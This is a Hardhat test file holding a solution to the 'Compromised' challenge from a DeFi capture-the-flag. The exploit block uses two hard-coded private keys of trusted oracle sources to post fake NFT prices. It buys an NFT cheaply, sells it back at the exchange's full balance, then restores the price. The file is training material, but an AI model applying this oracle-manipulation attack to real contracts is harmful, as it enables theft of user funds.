const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        const key2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';

        const oracle1 = new ethers.Wallet(key1, ethers.provider);
        const oracle2 = new ethers.Wallet(key2, ethers.provider);

        console.log(oracle1.address);
        console.log(oracle2.address);

        const orc1Trust = this.oracle.connect(oracle1);
        const orc2Trust = this.oracle.connect(oracle2);

        let priceToSet = ethers.utils.parseEther("0.01");

        const setMedianPrice = async (amount) => {
            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());

            console.log("Posting to oracle 1");
            await orc1Trust.postPrice("DVNFT", amount)
            
            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());

            console.log("Posting to oracle 2");
            await orc2Trust.postPrice("DVNFT", amount)

            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
            console.log("Current median price is", currMedianPrice.toString());
        }

        await setMedianPrice(priceToSet);

        const attackExchange = this.exchange.connect(attacker);
        await attackExchange.buyOne({
            value: priceToSet
        })

        const attackNFT = this.nftToken.connect(attacker);

        const tokenCount = await attackNFT.balanceOf(attacker.address);
        const tokenId = 0;
        const ownerId = await attackNFT.ownerOf(tokenId);

        console.log("Acquired token id:", tokenId.toString());
        console.log("Owner of token is", ownerId);

        console.log("Setting price to balance of exchange");
        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);

        priceToSet = balOfExchange

        await setMedianPrice(priceToSet);

        const prices = await this.oracle.getAllPricesForSymbol("DVNFT");

        prices.forEach(price => console.log(price.toString()))

        console.log("Selling NFT for the median price");
        
        await attackNFT.approve(attackExchange.address, tokenId);
        await attackExchange.sellOne(tokenId);

        priceToSet = INITIAL_NFT_PRICE;
        await setMedianPrice(priceToSet);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
